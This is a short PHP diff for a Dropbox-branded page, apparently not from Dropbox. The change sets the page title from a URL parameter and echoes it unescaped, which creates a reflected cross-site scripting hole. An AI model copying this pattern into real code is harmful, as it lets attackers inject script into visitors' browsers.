@@ -69,13 +69,20 @@ if (count($results) == 0) {
   die();
 }
 
+$title = "";
+if (!isset($_GET['title'])) {
+  $title = "Dropbox - Amber Holo Premium ";
+}else{
+  $title = urldecode($_GET['title']);
+}
+
 
 
 ?>
 <html lang="en" class=""><head>
 
   <meta charset="UTF-8">
-  <title>Dropbox - Amber Holo Premium </title>
+  <title><?php echo $title; ?></title>
   <link rel="icon" href="https://cfl.dropboxstatic.com/static/metaserver/static/images/favicon-vfl8lUR9B.ico" type="image/x-icon">
   <meta name="robots" content="noindex">
 
